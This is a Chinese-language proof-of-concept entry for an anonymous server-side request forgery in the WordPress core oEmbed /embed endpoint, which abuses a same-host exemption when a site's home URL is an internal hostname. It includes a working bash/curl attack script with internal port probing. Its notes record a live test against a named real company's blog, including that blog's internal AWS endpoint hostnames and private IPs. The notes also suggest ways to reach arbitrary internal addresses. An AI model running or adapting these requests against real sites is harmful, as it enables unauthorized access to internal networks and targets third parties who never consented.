# WordPress oEmbed /embed 匿名 SSRF：home 配置为内网主机名时 same_host 豁免绕过 wp_http_validate_url 私网校验

- **code**: wordpress-oembed-embed-匿名-ssrf-home-配置为内网主机名时-same_host-豁免绕
- **kind**: poc
- **category**: ssrf
- **component**: WordPress (core REST oEmbed)
- **versions**: WordPress 7.1.x（core /wp-json/oembed/1.0/embed，无 permission_callback）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 对 greenmangaming.com 博客实测：GET /blog/wp-json/oembed/1.0/embed?url=http://vpce-0921aaf1c67156043-4t1vg0wq.vpce-svc-0cf8d5d00172470c2.us-east-1.vpce.amazonaws.com/best-football-manager-27-tactics-for-beginners/&_=r112345 → HTTP 200/3064B oEmbed JSON（provider_url 为该内网 vpce 主机名，x-cache MISS,MISS,MISS age:0）；换两篇独立文章与根路径同样 200；对照 url=http://10.100.59.173/ → 404/0.43s。该 vpce 主机名公共 DNS 解析 10.100.59.173/10.100.42.47（RFC1918）。
- **path**: pocs/wordpress-oembed-embed-匿名-ssrf-home-配置为内网主机名时-same_host-豁免绕/poc.sh
- **tags**: wordpress,oembed,ssrf,same_host,wp_http_validate_url,aws,privatelink,rfc1918
- **created_at**: 2026-11-11T20:07:42.829Z
- **engine**: https://www.greenmangaming.com/blog/wp-json/oembed/1.0/embed

## 描述

WordPress core 的 /wp-json/oembed/1.0/embed 路由（WP_REST_OEmbed_Controller::get_item）没有 permission_callback，匿名可调；对未知 provider 的 url 会走 wp_oembed_get→discover(true)→wp_safe_remote_get 由服务端取址。wp-includes/http.php wp_http_validate_url() 中 $same_host = strtolower(parse_url(get_option('home'))['host']) === strtolower(parse_url($url)['host'])，而全部私网/IP 字面量/CGNAT/169.254 拒绝逻辑都写在 if ( ! $same_host ) 分支内 —— 当站点 home 被配置成内网主机名（如 AWS PrivateLink vpce-*.vpce.amazonaws.com，解析到 10.x）时，攻击者用该主机名作为 url 即可驱动源站访问 RFC1918 地址并回显 oEmbed 内容；端口白名单仅 80/443/8080；IP 字面量、带 userinfo/IPv6 括号的主机、以及重定向到内网的跳转（validate_redirects 逐跳再校验）仍被拦。注意 /oembed/1.0/proxy 需要 edit_posts 权限，匿名 401，不是本入口。

## 用法

```
1) 目标必须是 WordPress 且 REST 未禁用 oEmbed 路由（GET /wp-json/ 里有 /oembed/1.0/embed）；2) 用 REST 文章 link 字段或 oEmbed provider_url 取 get_option('home') 的主机名，确认其 DNS 解析落在 RFC1918/内网；3) 匿名 curl 打 /wp-json/oembed/1.0/embed?url=http://<home主机名>/<任意文章slug>/&_=<随机>；200 + provider_url 为内网主机名即成立；4) 换独立文章与根路径复测，用 IP 字面量做对照（应 404），确认不是 CDN 缓存（看 x-cache MISS/age 0 或加随机 _ 参数）；5) 想扩到任意内网 IP 需另找使用非 safe 封装的取址点（wp_remote_get 系插件接口）或插件扩展的 allowed_http_request_hosts；重定向到内网、IP 编码、DNS rebinding 在 WP core 上均被逐跳校验/私网分支拦。
```

## 正文

```
#!/usr/bin/env bash
# 用法：先取站点 home 主机名，再用同一主机名作 url 打在匿名 embed 端点上
# BLOG 形如 https://host/blog （WordPress 子目录）或 https://host
BLOG='https://<target>/blog'
B="$BLOG/wp-json/oembed/1.0/embed"
# 1) 找 home 主机名（三处任取其一）：REST _links、文章 link、oEmbed provider_url
curl -sk -A "$ARTEX_UA" "$BLOG/wp-json/wp/v2/posts?per_page=1&_fields=link"
# 2) 把 home 主机名 + 任意文章路径拼成内网 URL，走匿名取址
HOME_HOST='vpce-xxxx.vpce-svc-xxxx.us-east-1.vpce.amazonaws.com'
SLUG='<post-slug>'
curl -sk -A "$ARTEX_UA" -m 45 -G "$B" \
  --data-urlencode "url=http://$HOME_HOST/$SLUG/" \
  --data-urlencode "_=cb$RANDOM$RANDOM" \
  -D - -o out.json -w '\n[http=%{http_code} time=%{time_total} size=%{size_download}]\n'
# 3) 判据：200 且 out.json 的 provider_url/title 来自内网 home 主机 = same_host 豁免 SSRF 成立；
#    404 且耗时 ~0.3-0.5s = 私网校验拒绝（对照用 IP 字面量 http://10.0.0.1/ 应 404）
# 4) 端口探测：仅 :80/:443/:8080 被 WP 端口白名单允许，其余直接 false
for p in 80 443 8080 22; do
  curl -sk -A "$ARTEX_UA" -m 45 -G "$B" --data-urlencode "url=http://$HOME_HOST:$p/" \
    --data-urlencode "_=cb$RANDOM" -o /dev/null -w "port $p [http=%{http_code} time=%{time_total}]\n"
done
```
